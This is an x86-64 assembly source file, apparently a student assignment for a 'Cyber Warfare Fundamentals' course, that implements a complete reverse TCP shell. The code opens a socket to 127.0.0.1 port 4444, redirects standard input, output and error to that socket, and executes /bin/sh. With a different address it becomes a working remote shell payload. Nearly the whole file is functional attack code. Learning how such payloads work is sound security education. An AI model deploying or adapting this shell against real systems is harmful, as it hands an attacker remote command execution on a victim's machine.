;Lab3_3 Remote Hello World
;Christian Sylvester
;CS495Z - Cyber Warfare Fundamentals
;Pex1 - Reverse TCP Shell Shoveler with x86-64
SECTION .data
	msg: db "/bin/sh", 0		;path to shell (points to /bin/dash)
	errExit: db "There was an error.  Please check the debugger.", 10, 0	;Error message for when the socket call fails
	cleanExit: db "The program exited without error.", 10, 0		;Message to be displayed on clean exit

SECTION .text
global _start

_start:
	;Create the socket
	mov rax, 41			;socket call code
	mov rdi, 2			;inet
	mov rsi, 1			;sock_stream
	mov rdx, 0			;protocol
	syscall				;sys_socket
	cmp rax, 0			;check for error return
	jl .error			;Jumps to error process
	;Connect to the socket
	mov r12, rax			;fd
	mov rax, 42			;connect call code
	mov rdx, 16			;addrlen
	mov dword [rsp-4], 0x0100007f	;inet addr 127.0.0.1
	mov word [rsp-6], 0x5c11	;port 4444
	mov byte [rsp-8], 2		;inet
	sub rsp, 8			;stack alignment
 	mov rsi, rsp			;sock_addr
	mov rdi, r12			;move fd into rdi for parameter
	syscall 			;sys_connect
	cmp rax, 0			;check for error return
	jl .error			;Jumps to error process
	;Duplicate stdin, stdout, and stderr
	mov rax, 33			;indicates dup2
	mov rsi, 0			;move old file descriptor to new param
	mov rdi, r12			;indicate file descriptor
	syscall				;dup2 for stdin
	cmp rax, 0			;check for error return
	jl .error			;Jumps to error process
	mov rax, 33			;indicates dup2
	mov rsi, 1			;move stdout
	mov rdi, r12			;indicate file descriptor
	syscall				;dup2 for stdout
	cmp rax, 0			;check for error return
	jl .error			;Jumps to error process
	mov rax, 33			;indicates dup2
	mov rsi, 2			;mov stderr
	mov rdi, r12			;indicate file descriptor
	syscall				;dup2 for stderr
	cmp rax, 0			;check for error return
	jl .error			;jumps to error process
	;Execute the shell
	mov rax, 59			;execve call code
	mov rdi, msg			;send /bin/sh
	xor rsi, rsi			;zero out rsi
	xor rdx, rdx			;zero out rdx
	syscall 			;sys_execve
	cmp rax, 0			;check for error return
	jl .error			;go to the error print
	;Close the Socket
	mov rax, 3			;close call code
	mov rdi, r12			;choose the fd (of the socket) to close
	syscall				;sys_close
	cmp rax, 0			;checks for errors
	jl .error			;jumps to error exit
	;Prepare to exit the program
	mov rax, 1			;write call code
	mov rdi, 1			;stdout
	mov rsi, cleanExit		;send the clean exit message
	mov rdx, 35			;the length of the message
	syscall				;call the write
	mov rdi, 0			;no error code
	jmp .exit			;exit cleanly at end of program
.exit:
	mov rax, 60			;exit call code
	syscall				;sys_exit
.error:
	mov r13, rax			;error code for storage
	mov rax, 1			;write call code
	mov rdi, 1			;stdout
	mov rsi, errExit		;send the error message to call
	mov rdx, 49			;length of the error message
	syscall				;call the write
	mov rdi, r13			;mov the error code to the exit call
	jmp .exit			;leave the program
